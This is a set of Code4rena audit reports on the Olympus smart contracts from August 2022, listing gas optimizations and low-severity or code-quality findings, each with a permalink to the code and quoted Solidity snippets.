https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L184 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L23 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L22 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L21 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L20 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L126 ### Mitigation Consider using uint256 with values 0 and 1 rather than bool    ## Pack structs tightly ### Summary Gas efficiency can be achieved by tightly packing the struct. Struct variables are stored in 32 bytes each so you can group smaller types to occupy less storage.   ### Details You can read more here: https://fravoll.github.io/solidity-patterns/tight_variable_packing.html or in the official documentation: https://docs.soliditylang.org/en/v0.4.21/miscellaneous.html ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/interfaces/IOperator.sol#L30-L35  ### Mitigation Order structs to reduce gas usage.  ## Store using Struct over multiple mappings ### Summary All these variables could be combine in a Struct in order to reduce the gas cost.  ### Details As noticed in:  https://gist.github.com/alexon1234/b101e3ac51bea3cbd9cf06f80eaa5bc2 When multiple mappings that access the same addresses, uints, etc, all of them can be mixed into an struct and then that data accessed like: mapping(datatype => newStructCreated) newStructMap; Also, you have this post where it explains the benefits of using Structs over mappings  https://medium.com/@novablitz/storing-structs-is-costing-you-gas-774da988895e  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L168 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L174-L181 - - -  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/external/OlympusERC20.sol#L666-L669 - - - https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L35-L39 - - - https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L95-L117  ### Mitigation Consider mixing different mappings into an struct when able in order to save gas.   ## Using private rather than public for constants saves gas ### Summary If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L59     `uint8 public constant decimals = 18;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L65     `uint256 public constant FACTOR_SCALE = 1e4;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L121     `uint256 public constant SUBMISSION_REQUIREMENT = 100;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L124     `uint256 public constant ACTIVATION_DEADLINE = 2 weeks;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L127     `uint256 public constant GRACE_PERIOD = 1 weeks;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L130     `uint256 public constant ENDORSEMENT_THRESHOLD = 20;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L133     `uint256 public constant EXECUTION_THRESHOLD = 33;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L137     `uint256 public constant EXECUTION_TIMELOCK = 3 days;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L89     `uint32 public constant FACTOR_SCALE = 1e4;`  ### Mitigation Consider replacing public for private in constants for gas saving.   ## Index initialized in for loop ### Summary In for loops is not needed to initialize indexes to 0 as it is the default uint/int value. This saves gas.  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L397 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L58   ### Mitigation Don't initialize variables to default value   ## ++i costs less gas compared to i++, the same happens with --i and i--  ### Summary ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration).  This statement is true even with the optimizer enabled.   ### Details i++ increments i and returns the initial value of i .  Which means: uint i = 1; i++; // == 1 but i == 2  But ++i returns the actual incremented value:  uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable  In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  ### Github Permalinks var++ https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L49 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L64 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L488 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L670 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L686  var-- https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L675 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L691   ### Mitigation Replace to ++i or --i as needed.    ## <array>.length should no be looked up in every loop of a for-loop ### Summary In loops not assigning the length to a variable so memory accessed a lot (caching local variables)  ### Details The overheads outlined below are PER LOOP, excluding the first loop storage arrays incur a Gwarmaccess (100 gas) memory arrays use MLOAD (3 gas) calldata arrays use CALLDATALOAD (3 gas)  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L278  ### Mitigation Assign the length of the array.length to a local variable in loops for gas savings     ## Shift right instead of dividing by 2 ### Summary Shifting is cheaper than dividing by 2  ### Details A division by 2 can be calculated by shifting one to the right. While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity’s division operation also includes a division-by-0 prevention which is bypassed using shifting.  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L372 `int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L427 `int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L41 `/// @dev                        Should be calculated as: (payoutDecimals - quoteDecimals) - ((payoutPriceDecimals - quotePriceDecimals) / 2)`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L419 `uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L420 `uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L786 `) * (FACTOR_SCALE + RANGE.spread(true) * 2)) /`  ### Mitigation Consider replacing / 2 with >> 1 here   ## Internal functions only called once can be inlined to save gas ### Summary Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls. ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L111-L114 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L652 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L409 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L378 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L351 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L325 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L295 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L279 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L266  ### Mitigation Consider changing internal function only called once to inline code for gas savings    ## Functions guaranteed to revert when called by normal users can be marked payable ### Summary If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function.  Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.  ### Details The extra opcodes avoided are: CALLVALUE (2), DUP1 (3), ISZERO (3), PUSH2 (3), JUMPI (10), PUSH1 (3), DUP1 (3), REVERT(0), JUMPDEST (1), POP (2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L439 `function grantRole(Role role_, address addr_) public onlyAdmin {`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L451 `function revokeRole(Role role_, address addr_) public onlyAdmin {`  ### Mitigation It's suggested to add payable to functions guaranteed to revert when called by normal users to improve gas costs   ## >= cheaper than > ### Summary Strict inequalities ( > ) are more expensive than non-strict ones ( >= ). This is due to some supplementary checks (ISZERO, 3 gas)  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L247 `if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {`  ### Mitigation Consider using >= 1 instead of > 0 to avoid some opcodes   ## <X> += <Y> costs more gas than <X> = <X> + <Y> for state variables ### Summary x+=y costs more gas than x=x+y for state variables  ### Github Permalinks - += https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L136  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L96  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L97  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L131  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/VOTES.sol#L58  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/BondCallback.sol#L143  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/BondCallback.sol#L144  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L198  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L252  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L254  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L103    - Same as += with state variables but -=  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L138  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L115  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L116  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L132  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/VOTES.sol#L56  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L194  ### Mitigation Don't use += for state variables as it cost more gas.  ## Use calldata instead of memory for function parameters ### Summary It is generally cheaper to load variables directly from calldata, rather than copying them to memory.  ### Details Only use memory if the variable needs to be modified ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L205 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/BondCallback.sol#L152 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L162 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L162 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/PriceConfig.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/TreasuryCustodian.sol#L53 ### Mitigation Use calldata rather than memory in external functions where the parameter is not modified but only read  ## Unused named returns ### Summary Using both named returns and a return statement isn’t necessary. Removing one of those can improve code clarity  ### Details Also as returns variable is ignored, it wastes extra gas  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L29 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/MINTR.sol#L25-L27 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L113-L115 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L115-L117 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L51-L53 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/VOTES.sol#L26-L29 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/BondCallback.sol#L177 ### Mitigation Remove return or returns when both used  
### [G-01] No need to explicitly initialize variables with default values  ### Impact If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  #### Findings: ``` src/Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) { src/utils/KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) { src/utils/KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ### [G-02] Cache Array Length Outside of Loop  #### Impact An array's length should be cached to save gas in for-loops Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  Here, I suggest storing the array's length in a variable before the for-loop, and use it instead:  #### Findings: ``` src/policies/Governance.sol::278 => for (uint256 step; step < instructions.length; ) { ```  ### [G-03] Use Shift Right/Left instead of Division/Multiplication if possible  #### Impact A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  #### Findings: ``` src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); src/policies/Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; src/policies/Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); src/policies/Operator.sol::786 => ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ``` Reference: https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g008---use-shift-rightleft-instead-of-divisionmultiplication-if-possible 
## [L-01] IT IS POSSIBLE THAT beat FUNCTION IS NOT CALLED FOR ENTIRE TIME DURING A FREQUENCY It is possible that the following `beat` function is not called by anybody for the entire time during a frequency. In this case, `PRICE.updateMovingAverage()` is not executed for that frequency. The price information for that frequency is not recorded, and the moving average becomes out-of-date as it is not updated with that frequency's price. Later, after someone calls `beat` again during a new frequency, the price information for the skipped frequency is still missing, and the duration between the current and earliest observations will be larger than specified. Because of this, the moving average deviates from the time-weighted average price to be more like an observation-weighted average price, which is also not as specified. To avoid these bookkeeping discrepancies, it can be beneficial to set up a bot to call `beat` for once during each frequency just in case nobody calls it during a frequency.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92-L109 ```solidity     function beat() external nonReentrant {         if (!active) revert Heart_BeatStopped();         if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();          // Update the moving average on the Price module         PRICE.updateMovingAverage();          // Trigger price range update and market operations         _operator.operate();          // Update the last beat timestamp         lastBeat += frequency();          // Issue reward to sender         _issueReward(msg.sender);          emit Beat(block.timestamp);     } ```  ## [L-02] UNRESOLVED TODO COMMENTS Comment regarding todo indicates that there is an unresolved action item for implementation, which need to be addressed before protocol deployment. Please review the todo comments in the following code.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L657 ```solidity         /// TODO determine if this should use the last price from the MA or recalculate the current price, ideally last price is ok since it should have been just updated and should include check against secondary? ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L51-L67 ```solidity     // TODO Currently allows anyone to revoke any approval EXCEPT activated policies.     // TODO must reorg policy storage to be able to check for deactivated policies.     function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {         if (Policy(policy_).isActive()) revert PolicyStillActive();          // TODO Make sure `policy_` is an actual policy and not a random address.          uint256 len = tokens_.length;         for (uint256 j; j < len; ) {             TRSRY.setApprovalFor(policy_, tokens_[j], 0);             unchecked {                 ++j;             }         }          emit ApprovalRevoked(policy_, tokens_);     } ```  ## [L-03] MISSING ZERO-ADDRESS CHECK FOR CRITICAL ADDRESSES To prevent unintended behaviors, the critical address inputs should be checked against `address(0)`.  Please consider checking `ohm_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L15-L17 ```solidity     constructor(Kernel kernel_, address ohm_) Module(kernel_) {         ohm = OHM(ohm_);     } ```  Please consider checking the addresses of `ohmEthPriceFeed_` and `reserveEthPriceFeed_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L71-L77 ```solidity     constructor(         Kernel kernel_,         AggregatorV2V3Interface ohmEthPriceFeed_,         AggregatorV2V3Interface reserveEthPriceFeed_,         uint48 observationFrequency_,         uint48 movingAverageDuration_     ) Module(kernel_) { ```  Please consider checking the addresses in `tokens_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L77-L81 ```solidity     constructor(         Kernel kernel_,         ERC20[2] memory tokens_,         uint256[3] memory rangeParams_ // [thresholdFactor, cushionSpread, wallSpread]     ) Module(kernel_) { ```  Please consider checking the addresses of `aggregator_` and `ohm_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L38-L45 ```solidity     constructor(         Kernel kernel_,         IBondAggregator aggregator_,         ERC20 ohm_     ) Policy(kernel_) {         aggregator = aggregator_;         ohm = ohm_;     } ```  Please consider checking the addresses in `tokens_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L92-L98 ```solidity     constructor(         Kernel kernel_,         IBondAuctioneer auctioneer_,         IBondCallback callback_,         ERC20[2] memory tokens_, // [ohm, reserve]         uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve]     ) Policy(kernel_) { ```  Please consider checking the address of `rewardToken_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L54-L59 ```solidity     constructor(         Kernel kernel_,         IOperator operator_,         ERC20 rewardToken_,         uint256 reward_     ) Policy(kernel_) { ```  ## [N-01] ESUBMISSION_REQUIREMENT IS USED TO COMPARE AGAINST 10000 BUT ENDORSEMENT_THRESHOLD AND EXECUTION_THRESHOLD ARE USED TO COMPARE AGAINST 100 `ESUBMISSION_REQUIREMENT`, `ENDORSEMENT_THRESHOLD`, and  `EXECUTION_THRESHOLD` in the following code are all used to represent percents. However, `ESUBMISSION_REQUIREMENT` is used to compare against 10000 while `ENDORSEMENT_THRESHOLD` and `EXECUTION_THRESHOLD` are used to compare against 100. This inconsistency can cause confusions and typos in the future. Please consider unifying these constants so they can be used to compare against the same number.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L119-L133 ```solidity     /// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).     /// @dev    This is set to 1% of the total supply.     uint256 public constant SUBMISSION_REQUIREMENT = 100;      ...      /// @notice Endorsements required to activate a proposal as percentage of total supply.     uint256 public constant ENDORSEMENT_THRESHOLD = 20;      /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.     uint256 public constant EXECUTION_THRESHOLD = 33;  ```  ## [N-02] Unreachable code `return true;` is unreachable in the following code. It can be removed for better readability and maintainability.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L45-L48 ```solidity     function transfer(address to_, uint256 amount_) public pure override returns (bool) {         revert VOTES_TransferDisabled();         return true;     } ```  ## [N-03] decimals CAN BE NAMED USING CAPITAL LETTERS AND UNDERSCORES Because the following `decimals` is a constant, it can be named using capital letters and underscores by convention, which improves readability and maintainability.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59 ```solidity     uint8 public constant decimals = 18; ```  ## [N-04] CONSTANTS CAN BE USED INSTEAD OF MAGIC NUMBERS To improve readability and maintainability, constants can be used instead of the magic numbers. Please consider replacing the magic numbers used in the following code with constants. ```solidity modules\PRICE.sol   90: if (exponent > 38) revert Price_InvalidParams();     modules\RANGE.sol   245: wallSpread_ > 10000 ||    246: wallSpread_ < 100 ||    247: cushionSpread_ > 10000 ||    248: cushionSpread_ < 100 ||   policies\Governance.sol   164: if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT)   217: (totalEndorsementsForProposal[proposalId_] * 100) <  policies\Operator.sol   103: if (configParams[1] > uint256(7 days) || configParams[1] < uint256(1 days))   106: if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();   108: if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])   111: if (configParams[4] > 10000 || configParams[4] < 100) revert Operator_InvalidParams();   114: configParams[5] < 1 hours ||   378: 36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals      433: 36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals      533: if (duration_ > uint256(7 days) || duration_ < uint256(1 days))   535: if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();   536: if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)   550: if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();   565: if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0) ```  ## [N-05] INCOMPLETE NATSPEC COMMENTS NatSpec comments provide rich code documentation. @param or @return comments are missing for the following functions. Please consider completing NatSpec comments for them. ```solidity Kernel.sol   235: function executeAction(Actions action_, address target_) external onlyExec   351: function _migrateKernel(Kernel newKernel_) internal      439: function grantRole(Role role_, address addr_) public onlyAdmin {     451: function revokeRole(Role role_, address addr_) public onlyAdmin {  modules\TRSRY.sol   64: function setApprovalFor(     75: function withdrawReserves(     92: function getLoan(ERC20 token_, uint256 amount_) external permissioned {     105: function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {     122: function setDebt(    modules\VOTES.sol   45: function transfer(address to_, uint256 amount_) public pure override returns (bool) {     51: function transferFrom(   ```  ## [N-06] MISSING NATSPEC COMMENTS NatSpec comments provide rich code documentation. NatSpec comments are missing for the following functions. Please consider adding them. ```solidity Kernel.sol   266: function _installModule(Module newModule_) internal {     279: function _upgradeModule(Module newModule_) internal {     295: function _activatePolicy(Policy policy_) internal {     325: function _deactivatePolicy(Policy policy_) internal {     378: function _reconfigurePolicies(Keycode keycode_) internal {    391: function _setPolicyPermissions(    409: function _pruneFromDependents(Policy policy_) internal {   modules\MINTR.sol   33: function mintOhm(address to_, uint256 amount_) public permissioned {      37: function burnOhm(address from_, uint256 amount_) public permissioned {     modules\TRSRY.sol   47: function KEYCODE() public pure override returns (Keycode) {     51: function VERSION() external pure override returns (uint8 major, uint8 minor) {     59: function getReserveBalance(ERC20 token_) external view returns (uint256) {     137: function _checkApproval(    modules\VOTES.sol   35: function mintTo(address wallet_, uint256 amount_) external permissioned {     39: function burnFrom(address wallet_, uint256 amount_) external permissioned {    utils\KernelUtils.sol   11: function toKeycode(bytes5 keycode_) pure returns (Keycode) {      16: function fromKeycode(Keycode keycode_) pure returns (bytes5) {     21: function toRole(bytes32 role_) pure returns (Role) {     26: function fromRole(Role role_) pure returns (bytes32) {     31: function ensureContract(address target_) view {     40: function ensureValidKeycode(Keycode keycode_) pure {     55: function ensureValidRole(Role role_) pure {   ```
## QA  ### Missing checks for address(0x0) when assigning values to address state variables  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L251  ```solidity File: /src/Kernel.sol 251:            executor = target_;  253:            admin = target_; ```  ### constants should be defined rather than using magic numbers There are several occurrences of literal values with unexplained meaning .Literal values in the codebase without an explained meaning make the code harder to read, understand and maintain, thus hindering the experience of developers, auditors and external contributors alike.  Developers should define a constant variable for every magic value used , giving it a clear and self-explanatory name. Additionally, for complex values, inline comments explaining how they were calculated or why they were chosen are highly recommended. Following [Solidity’s style guide](https://solidity.readthedocs.io/en/latest/style-guide.html#constants), constants should be named in UPPER_CASE_WITH_UNDERSCORES format, and specific public getters should be defined to read each one of them.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L242-L250  ```solidity File: /src/modules/RANGE.sol     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {         // Confirm spreads are within allowed values         if (             wallSpread_ > 10000 ||  //@audit 1000             wallSpread_ < 100 ||    //@audit 100             cushionSpread_ > 10000 || //@audit 1000             cushionSpread_ < 100 || //@audit 100             cushionSpread_ > wallSpread_         ) revert RANGE_InvalidParams();       264:         if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();   ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L90 ```solidity File: /src/modules/PRICE.sol @audit: 38 90:        if (exponent > 38) revert Price_InvalidParams();  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L376-L379 ```solidity File: /src/policies/Operator.sol 376:            uint256 bondScale = 10 **  //@audit: 10 378:                uint8( 379:                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals //@audit: 36 340:                );  430:            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals); //@audit: 10 431:            uint256 bondScale = 10 ** //@audit: 10 432:                uint8( 433:                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals //@audit: 36 434:                );  486:        while (price_ >= 10) { // @audit: 10 487:            price_ = price_ / 10;  // @audit: 10  518:        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams(); //@audit: 10000 & 100  535:        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams(); //@audit: 10_000  550:        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams(); //@audit: 